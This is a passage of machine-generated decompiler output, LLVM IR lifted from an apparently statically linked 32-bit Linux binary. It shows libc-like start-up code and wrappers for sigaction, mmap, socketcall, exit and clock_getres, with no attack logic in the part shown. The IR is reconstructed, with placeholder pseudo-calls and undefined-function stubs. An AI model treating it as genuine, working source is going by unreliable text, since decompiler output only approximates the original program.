  br i1 %v1_8054066, label %dec_label_pc_8054081, label %dec_label_pc_8054068

dec_label_pc_8054068:                             ; preds = %dec_label_pc_8054051
  %v0_805406a = load i32, i32* @ebx, align 4
  %v6_8054070 = call i32 @function_80522a2(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805547c.237, i32 0, i32 0), i32 %v0_805406a)
  %v1_8054078 = load i32, i32* @esi, align 4
  %v12_8054078 = icmp eq i32 %v6_8054070, %v1_8054078
  br i1 %v12_8054078, label %dec_label_pc_8054081, label %dec_label_pc_805407c

dec_label_pc_805407c:                             ; preds = %dec_label_pc_8054068
  %v0_805407c = call i32 @function_8053a85()
  br label %dec_label_pc_8054081

dec_label_pc_8054081:                             ; preds = %dec_label_pc_8054068, %dec_label_pc_8054051, %dec_label_pc_805407c
  %v2_8054081 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8054052, i32* @ebx, align 4
  store i32 %v0_8054051, i32* @esi, align 4
  ret i32 %v2_8054081

; uselistorder directives
  uselistorder i32 ()* @function_8053a85, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_80522a2, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_80520cd, { 4, 5, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054081, { 2, 0, 1 }
}

define i32 @function_8054085() local_unnamed_addr {
dec_label_pc_8054085:
  %v0_8054088 = load i8, i8* @global_var_8056910.238, align 16
  %v1_8054088 = icmp eq i8 %v0_8054088, 0
  %v1_805408f = icmp eq i1 %v1_8054088, false
  br i1 %v1_805408f, label %dec_label_pc_8054085.dec_label_pc_80540c1_crit_edge, label %dec_label_pc_8054091

dec_label_pc_8054085.dec_label_pc_80540c1_crit_edge: ; preds = %dec_label_pc_8054085
  %v0_80540c4.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80540c1

dec_label_pc_8054091:                             ; preds = %dec_label_pc_8054085
  store i8 1, i8* @global_var_8056910.238, align 16
  store i32 4096, i32* @global_var_8056904.239, align 4
  br label %dec_label_pc_80540c1

dec_label_pc_80540c1:                             ; preds = %dec_label_pc_8054085.dec_label_pc_80540c1_crit_edge, %dec_label_pc_8054091
  %v0_80540c4 = phi i32 [ %v0_80540c4.pre, %dec_label_pc_8054085.dec_label_pc_80540c1_crit_edge ], [ 0, %dec_label_pc_8054091 ]
  ret i32 %v0_80540c4

; uselistorder directives
  uselistorder i8 1, { 11, 1, 12, 4, 5, 6, 2, 3, 8, 0, 13, 14, 15, 16, 7, 10, 9 }
  uselistorder i8* @global_var_8056910.238, { 1, 0 }
  uselistorder label %dec_label_pc_80540c1, { 1, 0 }
}

define i32 @function_80540c5(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80540c5:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp43 = ptrtoint i32* %arg2 to i32
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_80540c7 = load i32, i32* @esi, align 4
  store i32 %tmp43, i32* @edi, align 4
  store i32 %arg6, i32* @global_var_80568fc.240, align 4
  store i32 %arg5, i32* @global_var_805690c.236, align 4
  store i32 %arg3, i32* @ebp, align 4
  %v2_80540fc = mul i32 %arg1, 4
  %v3_80540fc = add i32 %tmp43, %v2_80540fc
  %v1_80540ff = add i32 %v3_80540fc, 4
  store i32 %v1_80540ff, i32* @global_var_8056900.241, align 256
  %v3_8054107 = load i32, i32* %arg2, align 4
  %v14_8054107 = icmp eq i32 %v1_80540ff, %v3_8054107
  %v1_8054109 = icmp eq i1 %v14_8054107, false
  br i1 %v1_8054109, label %dec_label_pc_8054111, label %dec_label_pc_805410b

dec_label_pc_805410b:                             ; preds = %dec_label_pc_80540c5
  store i32 %v3_80540fc, i32* @global_var_8056900.241, align 256
  br label %dec_label_pc_8054111

dec_label_pc_8054111:                             ; preds = %dec_label_pc_80540c5, %dec_label_pc_805410b
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8054116 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8054116, i32* %stack_var_-172, align 4
  %v3_805411b = bitcast i32* %stack_var_-136 to i8*
  %v4_805411b = call i32 @function_805271a(i8* %v3_805411b, i32 0, i32 120)
  %v0_8054120 = load i32, i32* @global_var_8056900.241, align 256
  br label %dec_label_pc_8054128

dec_label_pc_8054128:                             ; preds = %dec_label_pc_8054128, %dec_label_pc_8054111
  %v0_8054128 = phi i32 [ %v1_805412b, %dec_label_pc_8054128 ], [ %v0_8054120, %dec_label_pc_8054111 ]
  %v1_8054128 = inttoptr i32 %v0_8054128 to i32*
  %v2_8054128 = load i32, i32* %v1_8054128, align 4
  %v3_8054128 = icmp eq i32 %v2_8054128, 0
  %v1_805412b = add i32 %v0_8054128, 4
  %v1_805412e = icmp eq i1 %v3_8054128, false
  br i1 %v1_805412e, label %dec_label_pc_8054128, label %dec_label_pc_805414f.preheader

dec_label_pc_805414f.preheader:                   ; preds = %dec_label_pc_8054128
  store i32 %v1_805412b, i32* @ebx, align 4
  %v1_805414f22 = inttoptr i32 %v1_805412b to i32*
  %v2_805414f23 = load i32, i32* %v1_805414f22, align 4
  %v3_805414f24 = icmp eq i32 %v2_805414f23, 0
  %v1_805415226 = icmp eq i1 %v3_805414f24, false
  br i1 %v1_805415226, label %dec_label_pc_8054134.lr.ph, label %dec_label_pc_8054154

dec_label_pc_8054134.lr.ph:                       ; preds = %dec_label_pc_805414f.preheader
  %v3_8054114 = ptrtoint i32* %stack_var_-168 to i32
  %v3_805413f = add i32 %v3_8054114, 32
  br label %dec_label_pc_8054134

dec_label_pc_8054134:                             ; preds = %dec_label_pc_8054134.lr.ph, %dec_label_pc_805414c
  %v1_805413f = phi i32 [ %v2_805414f23, %dec_label_pc_8054134.lr.ph ], [ %v2_805414f, %dec_label_pc_805414c ]
  %v0_805413e = phi i32 [ %v1_805412b, %dec_label_pc_8054134.lr.ph ], [ %v1_805414c, %dec_label_pc_805414c ]
  %v6_8054139 = icmp ugt i32 %v1_805413f, 14
  br i1 %v6_8054139, label %dec_label_pc_805414c, label %dec_label_pc_805413b

dec_label_pc_805413b:                             ; preds = %dec_label_pc_8054134
  store i32 %v0_805413e, i32* %stack_var_-168, align 4
  %v2_805413f = mul i32 %v1_805413f, 8
  %v4_805413f = add i32 %v3_805413f, %v2_805413f
  store i32 %v4_805413f, i32* %stack_var_-172, align 4
  %v3_8054144 = inttoptr i32 %v4_805413f to i16*
  %v4_8054144 = call i32 @function_8054912(i16* %v3_8054144, i32 %v0_805413e, i32 8)
  %v0_805414c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805414c

dec_label_pc_805414c:                             ; preds = %dec_label_pc_8054134, %dec_label_pc_805413b
  %v0_805414c = phi i32 [ %v0_805413e, %dec_label_pc_8054134 ], [ %v0_805414c.pre, %dec_label_pc_805413b ]
  %v1_805414c = add i32 %v0_805414c, 8
  store i32 %v1_805414c, i32* @ebx, align 4
  %v1_805414f = inttoptr i32 %v1_805414c to i32*
  %v2_805414f = load i32, i32* %v1_805414f, align 4
  %v3_805414f = icmp eq i32 %v2_805414f, 0
  %v1_8054152 = icmp eq i1 %v3_805414f, false
  br i1 %v1_8054152, label %dec_label_pc_8054134, label %dec_label_pc_8054154

dec_label_pc_8054154:                             ; preds = %dec_label_pc_805414c, %dec_label_pc_805414f.preheader
  store i32 %v2_8054116, i32* @eax, align 4
  %v0_8054158 = call i32 @function_80549cd()
  store i32 %v0_8054158, i32* @eax, align 4
  %v0_805415d = call i32 @function_8054085()
  %v1_8054166 = icmp eq i32 %tmp38, 0
  %v1_8054168 = icmp eq i1 %v1_8054166, false
  br i1 %v1_8054168, label %dec_label_pc_805416e, label %dec_label_pc_805416a

dec_label_pc_805416a:                             ; preds = %dec_label_pc_8054154
  %v1_805416a = and i32 %tmp38, -65536
  %v2_805416a = or i32 %v1_805416a, 4096
  br label %dec_label_pc_805416e

dec_label_pc_805416e:                             ; preds = %dec_label_pc_8054154, %dec_label_pc_805416a
  %v0_805416e = phi i32 [ %tmp38, %dec_label_pc_8054154 ], [ %v2_805416a, %dec_label_pc_805416a ]
  store i32 %v0_805416e, i32* @global_var_8056904.239, align 4
  %v13_8054173 = icmp eq i32 %tmp37, -1
  %v1_8054178 = icmp eq i1 %v13_8054173, false
  br i1 %v1_8054178, label %dec_label_pc_80541a3, label %dec_label_pc_805417a

dec_label_pc_805417a:                             ; preds = %dec_label_pc_805416e
  %v0_805417a = call i32 @function_80546f1()
  store i32 %v0_805417a, i32* @ebx, align 4
  %v0_8054181 = call i32 @function_8054660()
  %v0_8054186 = load i32, i32* @ebx, align 4
  %v12_8054186 = icmp eq i32 %v0_8054186, %v0_8054181
  %v1_8054188 = icmp eq i1 %v12_8054186, false
  br i1 %v1_8054188, label %dec_label_pc_80541b9, label %dec_label_pc_805418a

dec_label_pc_805418a:                             ; preds = %dec_label_pc_805417a
  %v0_805418a = call i32 @function_8054686()
  store i32 %v0_805418a, i32* @ebx, align 4
  %v0_8054191 = call i32 @function_805463a()
  %v0_8054196 = load i32, i32* @ebx, align 4
  %v12_8054196 = icmp eq i32 %v0_8054196, %v0_8054191
  %v1_8054198 = icmp eq i1 %v12_8054196, false
  br i1 %v1_8054198, label %dec_label_pc_80541b9, label %dec_label_pc_805419a.thread

dec_label_pc_805419a.thread:                      ; preds = %dec_label_pc_805418a
  br label %dec_label_pc_80541e3

dec_label_pc_80541a3:                             ; preds = %dec_label_pc_805416e
  %v15_80541a3 = icmp eq i32 %tmp37, %tmp36
  %v1_80541a7 = icmp eq i1 %v15_80541a3, false
  br i1 %v1_80541a7, label %dec_label_pc_80541b9, label %dec_label_pc_80541a9

dec_label_pc_80541a9:                             ; preds = %dec_label_pc_80541a3
  br label %dec_label_pc_80541b9

dec_label_pc_80541b9:                             ; preds = %dec_label_pc_80541a9, %dec_label_pc_80541a3, %dec_label_pc_805418a, %dec_label_pc_805417a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80541c0 = call i32 @function_8054051()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80541cf = call i32 @function_8054051()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80541de = call i32 @function_8054051()
  br label %dec_label_pc_80541e3

dec_label_pc_80541e3:                             ; preds = %dec_label_pc_805419a.thread, %dec_label_pc_80541b9
  store i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32* %esi.global-to-local, align 4
  %v0_80541e8 = load i32, i32* @edi, align 4
  %v1_80541e8 = inttoptr i32 %v0_80541e8 to i32*
  %v2_80541e8 = load i32, i32* %v1_80541e8, align 4
  store i32 %v2_80541e8, i32* bitcast (i32** @global_var_8056828.243 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg4, i32* @global_var_8056908.235, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32 0), label %dec_label_pc_8054208, label %dec_label_pc_8054214

dec_label_pc_8054208:                             ; preds = %dec_label_pc_80541e3, %dec_label_pc_8054208
  %v4_8054208 = phi i32 [ %v1_805420f, %dec_label_pc_8054208 ], [ 0, %dec_label_pc_80541e3 ]
  %v5_8054208 = mul i32 %v4_8054208, 4
  %v6_8054208 = add i32 %v5_8054208, ptrtoint (i32* @global_var_80567a4.233 to i32)
  %v7_8054208 = inttoptr i32 %v6_8054208 to i32*
  %v8_8054208 = load i32, i32* %v7_8054208, align 4
  call void @__pseudo_call(i32 %v8_8054208)
  %v0_805420f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805420f = add i32 %v0_805420f, 1
  store i32 %v1_805420f, i32* %ebx.global-to-local, align 4
  %v1_8054210 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054210 = icmp ult i32 %v1_805420f, %v1_8054210
  br i1 %v7_8054210, label %dec_label_pc_8054208, label %dec_label_pc_8054214

dec_label_pc_8054214:                             ; preds = %dec_label_pc_8054208, %dec_label_pc_80541e3
  call void @__pseudo_call(i32 %arg3)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32 0), label %dec_label_pc_805422c, label %dec_label_pc_8054238

dec_label_pc_805422c:                             ; preds = %dec_label_pc_8054214, %dec_label_pc_805422c
  %v4_805422c = phi i32 [ %v1_8054233, %dec_label_pc_805422c ], [ 0, %dec_label_pc_8054214 ]
  store i32 ptrtoint (i32* @global_var_8054233.245 to i32), i32* %stack_var_-172, align 4
  %v5_805422c = mul i32 %v4_805422c, 4
  %v6_805422c = add i32 %v5_805422c, ptrtoint (i32* @global_var_80567a4.233 to i32)
  %v7_805422c = inttoptr i32 %v6_805422c to i32*
  %v8_805422c = load i32, i32* %v7_805422c, align 4
  call void @__pseudo_call(i32 %v8_805422c)
  %v0_8054233 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054233 = add i32 %v0_8054233, 1
  store i32 %v1_8054233, i32* %ebx.global-to-local, align 4
  %v1_8054234 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054234 = icmp ult i32 %v1_8054233, %v1_8054234
  br i1 %v7_8054234, label %dec_label_pc_805422c, label %dec_label_pc_8054238

dec_label_pc_8054238:                             ; preds = %dec_label_pc_805422c, %dec_label_pc_8054214
  %v0_8054241 = load i32, i32* %stack_var_-172, align 4
  %v1_8054241 = call i32 @function_80526c9(i32 %v0_8054241)
  %v1_8054246 = inttoptr i32 %v1_8054241 to i32*
  store i32 0, i32* %v1_8054246, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-172, align 4
  call void @__pseudo_call(i32 %v0_80540c7)
  %v0_8054276 = load i32, i32* @eax, align 4
  %v1_8054279 = call i32 @function_8053cd9(i32 %v0_8054276)
  %v0_8054285 = load i32, i32* @ebx, align 4
  %v1_8054285 = inttoptr i32 %v0_8054285 to %sigcontext*
  %v2_8054285 = call i32 @sigreturn(%sigcontext* %v1_8054285)
  %v0_805428d = load i32, i32* @ebx, align 4
  %v1_805428d = inttoptr i32 %v0_805428d to %sigcontext*
  %v2_805428d = call i32 @sigreturn(%sigcontext* %v1_805428d)
  ret i32 %v2_805428d

; uselistorder directives
  uselistorder i32 %v1_8054233, { 1, 2, 0 }
  uselistorder i32 %v1_805420f, { 1, 2, 0 }
  uselistorder i32 %v2_805414f, { 1, 0 }
  uselistorder i32 %v1_805414c, { 2, 1, 0 }
  uselistorder i32 %v1_805412b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054128, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32* %stack_var_-172, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @function_8053cd9, { 0, 2, 1 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_8054051, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 120, { 8, 22, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805422c, { 1, 0 }
  uselistorder label %dec_label_pc_8054208, { 1, 0 }
  uselistorder label %dec_label_pc_80541e3, { 1, 0 }
  uselistorder label %dec_label_pc_805416e, { 1, 0 }
  uselistorder label %dec_label_pc_805414c, { 1, 0 }
  uselistorder label %dec_label_pc_8054134, { 1, 0 }
  uselistorder label %dec_label_pc_8054111, { 1, 0 }
}

define i32 @function_805428f(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805428f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805428f = load i32, i32* @esi, align 4
  %v0_8054290 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80542a5 = icmp eq i32* %arg2, null
  br i1 %v1_80542a5, label %dec_label_pc_80542f8, label %dec_label_pc_80542a9

dec_label_pc_80542a9:                             ; preds = %dec_label_pc_805428f
  %v2_80542a9 = load i32, i32* %arg2, align 4
  store i32 %v2_80542a9, i32* %stack_var_-148, align 4
  %v1_80542b2 = add i32 %tmp11, 4
  %v3_80542c4 = bitcast i32* %stack_var_-136 to i16*
  %v4_80542c4 = call i32 @function_8054912(i16* %v3_80542c4, i32 %v1_80542b2, i32 128)
  %v1_80542c9 = add i32 %tmp11, 132
  %v2_80542e3 = inttoptr i32 %v1_80542c9 to i8*
  %v3_80542e3 = load i8, i8* %v2_80542e3, align 1
  %v4_80542e3 = and i8 %v3_80542e3, 4
  %v5_80542e3 = icmp eq i8 %v4_80542e3, 0
  %v1_80542ea = icmp eq i1 %v5_80542e3, false
  br i1 %v1_80542ea, label %dec_label_pc_80542f8, label %dec_label_pc_80542ec

dec_label_pc_80542ec:                             ; preds = %dec_label_pc_80542a9
  br label %dec_label_pc_80542f8

dec_label_pc_80542f8:                             ; preds = %dec_label_pc_80542ec, %dec_label_pc_80542a9, %dec_label_pc_805428f
  %v1_80542fa = icmp eq i32 %arg3, 0
  br i1 %v1_80542fa, label %dec_label_pc_8054302, label %dec_label_pc_80542fe

dec_label_pc_80542fe:                             ; preds = %dec_label_pc_80542f8
  %v2_80542fe = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054302

dec_label_pc_8054302:                             ; preds = %dec_label_pc_80542f8, %dec_label_pc_80542fe
  %v0_8054311 = phi i32 [ 0, %dec_label_pc_80542f8 ], [ %v2_80542fe, %dec_label_pc_80542fe ]
  br i1 %v1_80542a5, label %dec_label_pc_805430f, label %dec_label_pc_8054308

dec_label_pc_8054308:                             ; preds = %dec_label_pc_8054302
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805430f

dec_label_pc_805430f:                             ; preds = %dec_label_pc_8054302, %dec_label_pc_8054308
  %v0_8054312 = phi %sigaction* [ null, %dec_label_pc_8054302 ], [ %phitmp, %dec_label_pc_8054308 ]
  %v5_805431a = call i32 @function_80543b5(i32 %arg1, %sigaction* %v0_8054312, i32 %v0_8054311, i32 8)
  store i32 %v5_805431a, i32* %ebx.global-to-local, align 4
  br i1 %v1_80542fa, label %dec_label_pc_805435d, label %dec_label_pc_8054328

dec_label_pc_8054328:                             ; preds = %dec_label_pc_805430f
  %v2_8054328 = icmp slt i32 %v5_805431a, 0
  br i1 %v2_8054328, label %dec_label_pc_805435d, label %dec_label_pc_805432c

dec_label_pc_805432c:                             ; preds = %dec_label_pc_8054328
  %v3_805432c = load i32, i32* %stack_var_-288, align 4
  %v2_8054330 = inttoptr i32 %arg3 to i32*
  store i32 %v3_805432c, i32* %v2_8054330, align 4
  %v2_8054338 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805433d = add i32 %arg3, 4
  %v3_8054341 = inttoptr i32 %v1_805433d to i16*
  %v4_8054341 = call i32 @function_8054912(i16* %v3_8054341, i32 %v2_8054338, i32 128)
  %v2_805434a = add i32 %arg3, 132
  %v3_805434a = inttoptr i32 %v2_805434a to i32*
  %v2_8054357 = add i32 %arg3, 136
  %v3_8054357 = inttoptr i32 %v2_8054357 to i32*
  %v0_805435d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805435d

dec_label_pc_805435d:                             ; preds = %dec_label_pc_8054328, %dec_label_pc_805430f, %dec_label_pc_805432c
  %v0_805435d = phi i32 [ %v5_805431a, %dec_label_pc_8054328 ], [ %v5_805431a, %dec_label_pc_805430f ], [ %v0_805435d.pre, %dec_label_pc_805432c ]
  store i32 %v0_8054290, i32* @ebx, align 4
  store i32 %v0_805428f, i32* @esi, align 4
  ret i32 %v0_805435d

; uselistorder directives
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805435d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805430f, { 1, 0 }
  uselistorder label %dec_label_pc_8054302, { 1, 0 }
}

define i32 @function_8054368(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054368:
  %stack_var_4 = alloca i32, align 4
  %v0_8054368 = load i32, i32* @ebx, align 4
  store i32 %v0_8054368, i32* @edx, align 4
  %v2_8054373 = load i32, i32* @ecx, align 4
  %v4_8054373 = load i32, i32* @esi, align 4
  %v5_8054373 = load i32, i32* @edi, align 4
  %v6_8054373 = load i32, i32* @ebp, align 4
  %v7_8054373 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8054373, i32 %v0_8054368, i32 %v4_8054373, i32 %v5_8054373, i32 %v6_8054373)
  %v8_8054373 = ptrtoint i32* %v7_8054373 to i32
  store i32 %v0_8054368, i32* @ebx, align 4
  %v3_805437c = icmp ugt i32* %v7_8054373, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_805437c, i32 134564373)
  ret i32 %v8_8054373

; uselistorder directives
  uselistorder i32* @ebp, { 7, 67, 68, 69, 70, 71, 72, 73, 74, 32, 33, 34, 35, 75, 76, 77, 78, 79, 80, 81, 82, 87, 83, 84, 85, 86, 6, 88, 10, 2, 21, 22, 11, 29, 15, 8, 14, 16, 18, 1, 23, 9, 0, 28, 12, 13, 17, 19, 20, 24, 25, 26, 27, 30, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 4, 51, 52, 53, 54, 55, 56, 57, 58, 5, 59, 60, 61, 62, 63, 64, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 65, 66 }
  uselistorder i32* @ecx, { 5, 17, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 43, 1, 44, 20, 19, 18, 45, 46, 47, 2, 48, 49, 50, 3, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 7, 8, 4, 9, 10, 11, 62, 12, 13, 14, 15, 16, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 90, 91 }
}

define i32 @function_8054383(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054383:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054383 = load i32, i32* @ebx, align 4
  store i32 %v0_8054383, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054396 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054396, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8054396, -4095
  br i1 %tmp9, label %dec_label_pc_80543af, label %dec_label_pc_80543a3

dec_label_pc_80543a3:                             ; preds = %dec_label_pc_8054383
  %v1_80543a3 = call i32 @function_80526c9(i32 %v0_8054383)
  %v0_80543a8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80543a8 = sub i32 0, %v0_80543a8
  %v2_80543aa = inttoptr i32 %v1_80543a3 to i32*
  store i32 %v1_80543a8, i32* %v2_80543aa, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80543b3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80543af

dec_label_pc_80543af:                             ; preds = %dec_label_pc_8054383, %dec_label_pc_80543a3
  %v2_80543b3 = phi i32 [ %v0_8054383, %dec_label_pc_8054383 ], [ %v2_80543b3.pre, %dec_label_pc_80543a3 ]
  %v0_80543af = phi i32 [ %v1_8054396, %dec_label_pc_8054383 ], [ -1, %dec_label_pc_80543a3 ]
  %v2_80543b1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80543b1, i32* @edx, align 4
  store i32 %v2_80543b3, i32* @ebx, align 4
  ret i32 %v0_80543af

; uselistorder directives
  uselistorder i32 %v1_8054396, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80543af, { 1, 0 }
}

define i32 @function_80543b5(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80543b5:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_80543b6 = load i32, i32* @esi, align 4
  store i32 %v0_80543b6, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80543ca = load i32, i32* @ebx, align 4
  %v7_80543d2 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_80543d2, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_80543d2, -4095
  br i1 %tmp14, label %dec_label_pc_80543ea, label %dec_label_pc_80543de

dec_label_pc_80543de:                             ; preds = %dec_label_pc_80543b5
  %v1_80543de = call i32 @function_80526c9(i32 %v0_80543ca)
  %v0_80543e3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80543e3 = sub i32 0, %v0_80543e3
  %v2_80543e5 = inttoptr i32 %v1_80543de to i32*
  store i32 %v1_80543e3, i32* %v2_80543e5, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80543ed.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80543ea

dec_label_pc_80543ea:                             ; preds = %dec_label_pc_80543b5, %dec_label_pc_80543de
  %v2_80543ed = phi i32 [ %v0_80543b6, %dec_label_pc_80543b5 ], [ %v2_80543ed.pre, %dec_label_pc_80543de ]
  %v0_80543ea = phi i32 [ %v7_80543d2, %dec_label_pc_80543b5 ], [ -1, %dec_label_pc_80543de ]
  store i32 %v2_80543ed, i32* @esi, align 4
  ret i32 %v0_80543ea

; uselistorder directives
  uselistorder i32 %v7_80543d2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80543ea, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_80543f0(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_80543f0:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8054418(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054418:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054418 = load i32, i32* @ebx, align 4
  store i32 %v0_8054418, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805442b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805442b, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_805442b, -4095
  br i1 %tmp10, label %dec_label_pc_8054444, label %dec_label_pc_8054438

dec_label_pc_8054438:                             ; preds = %dec_label_pc_8054418
  %v1_8054438 = call i32 @function_80526c9(i32 %v0_8054418)
  %v0_805443d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805443d = sub i32 0, %v0_805443d
  %v2_805443f = inttoptr i32 %v1_8054438 to i32*
  store i32 %v1_805443d, i32* %v2_805443f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054448.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054444

dec_label_pc_8054444:                             ; preds = %dec_label_pc_8054418, %dec_label_pc_8054438
  %v2_8054448 = phi i32 [ %v0_8054418, %dec_label_pc_8054418 ], [ %v2_8054448.pre, %dec_label_pc_8054438 ]
  %v0_8054444 = phi i32 [ %v4_805442b, %dec_label_pc_8054418 ], [ -1, %dec_label_pc_8054438 ]
